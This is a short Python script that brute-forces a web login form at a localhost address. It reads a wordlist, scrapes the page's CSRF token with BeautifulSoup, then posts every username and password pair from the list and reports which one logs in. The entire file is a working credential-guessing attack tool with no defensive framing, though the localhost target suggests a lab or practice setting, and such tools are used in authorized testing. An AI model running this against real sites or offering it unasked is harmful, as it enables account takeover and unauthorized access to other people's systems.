import requests
from bs4 import BeautifulSoup

wordlist = []
file_name = 'wordlist.txt'

session = None

login_page = 'http://localhost:8000/login.php'
login_action = 'http://localhost:8000/controllers/loginController.php'

csrf = ''

def main():
    global session, csrf

    init_wordlist()

    # print(wordlist)

    session = requests.Session()
    page = session.get(login_page)

    soup = BeautifulSoup(page.content, 'html.parser')

    csrf = soup.find('input', {'name': '_token'})['value']
    # print(csrf)

    brute_force()

def brute_force():
    for username in wordlist:
        for password in wordlist:
            payload = {
                'username': username,
                'password': password,
                '_token': csrf
            }

            response = session.post(login_action, data=payload)
            
            if response.url != login_page:
                # success
                print(f'Username: {username}, Password: {password} succeeded')
                return
            else:
                # failed
                print(f'Username: {username}, Password: {password} failed')

def init_wordlist():
    file = open(file_name, 'r')

    for word in file:
        wordlist.append(word.strip())
    
    file.close()

if __name__ == "__main__":
    main()